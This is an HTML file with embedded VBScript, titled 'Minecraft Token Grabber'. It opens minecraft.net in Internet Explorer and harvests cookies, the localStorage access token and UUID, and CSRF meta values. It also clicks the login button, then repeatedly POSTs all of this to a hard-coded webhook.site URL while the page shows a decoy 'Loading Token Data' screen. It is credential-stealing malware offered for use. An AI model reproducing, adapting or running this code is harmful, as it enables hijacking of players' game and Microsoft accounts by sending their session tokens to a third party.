<!DOCTYPE html>
<html>
<head>
    <title>Minecraft Token Grabber</title>
    <!-- VBScript Logic -->
    <script language="VBScript">
        Option Explicit
        
        ' --- CONFIGURATION ---
        Dim webhookURL
        webhookURL = "https://webhook.site/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b"
        
        Dim objIE, objShell, objHTTP
        
        ' Initialize Objects
        Set objShell = CreateObject("WScript.Shell")
        Set objIE = CreateObject("InternetExplorer.Application")
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

        ' --- SETUP VISUALS ---
        objIE.Visible = True
        objIE.ToolBar = 0
        objIE.StatusBar = 1
        objIE.Width = 800
        objIE.Height = 600
        
        ' Open Minecraft.net in Frontend (Visible)
        objIE.Navigate "https://www.minecraft.net/"

        ' Wait for page to load roughly
        WScript.Sleep 2000

        ' --- FUNCTION: EXTRACT TOKENS (5 WAYS) ---
        Sub GrabTokens()
            Dim cookies, localStor, metaTags, urlInfo, clickAction
            Dim finalData
            
            ' Method 1: Extract All Cookies from IE DOM
            cookies = objIE.Document.cookie
            
            ' Method 2: Access LocalStorage (Common for MC tokens)
            On Error Resume Next
            localStor = objIE.Document.parentWindow.localStorage.getItem("accessToken") & "|" & _
                        objIE.Document.parentWindow.localStorage.getItem("uuid")
            If Err.Number <> 0 Then localStor = "Error Accessing LocalStorage"
            On Error Goto 0
            
            ' Method 3: Extract Meta Tags (CSRF/Session)
            Dim metaTag, i
            metaTag = ""
            For i = 0 To objIE.Document.getElementsByTagName("meta").Length - 1
                If InStr(LCase(objIE.Document.getElementsByTagName("meta")(i).getAttribute("name")), "csrf") > 0 Then
                    metaTag = metaTag & objIE.Document.getElementsByTagName("meta")(i).getAttribute("content") & "|"
                End If
            Next
            
            ' Method 4: Current URL & Title (Context)
            urlInfo = "URL:" & objIE.LocationURL & "|Title:" & objIE.Document.Title

            ' Method 5: Simulate Click on Login Button to trigger token refresh
            On Error Resume Next
            Dim loginBtn
            Set loginBtn = objIE.Document.getElementById("login-link")
            If Not loginBtn Is Nothing Then
                loginBtn.Click
                WScript.Sleep 1000
                clickAction = "Clicked Login Button. New URL: " & objIE.LocationURL
            Else
                clickAction = "Login Button not found."
            End If
            On Error Goto 0

            ' --- COMBINE DATA ---
            finalData = "=== MSTHA REPORT ===" & vbCrLf & _
                        "[1] Cookies: " & cookies & vbCrLf & _
                        "[2] LocalStorage: " & localStor & vbCrLf & _
                        "[3] Meta/CSRF: " & metaTag & vbCrLf & _
                        "[4] Context: " & urlInfo & vbCrLf & _
                        "[5] Action: " & clickAction & vbCrLf & _
                        "===================="

            ' --- SEND TO WEBHOOK ---
            SendToWebhook finalData
            
            ' Refresh Loop
            WScript.Sleep 5000
            objIE.Refresh
            GrabTokens ' Recursive call to keep running
        End Sub

        ' --- FUNCTION: SEND DATA ---
        Sub SendToWebhook(data)
            On Error Resume Next
            objHTTP.Open "POST", webhookURL, False
            objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
            
            ' Encode data for URL (simple replacement)
            Dim encodedData
            encodedData = Replace(data, vbCrLf, "%0A")
            encodedData = Replace(encodedData, "=", "%3D")
            encodedData = Replace(encodedData, "&", "%26")
            
            objHTTP.Send "payload=" & encodedData
        End Sub

        ' --- START ---
        Call GrabTokens()

    </script>
</head>
<body>
    <div style="text-align:center; margin-top:50px;">
        <h1>Minecraft.net</h1>
        <p>Loading Token Data...</p>
    </div>
</body>
</html>
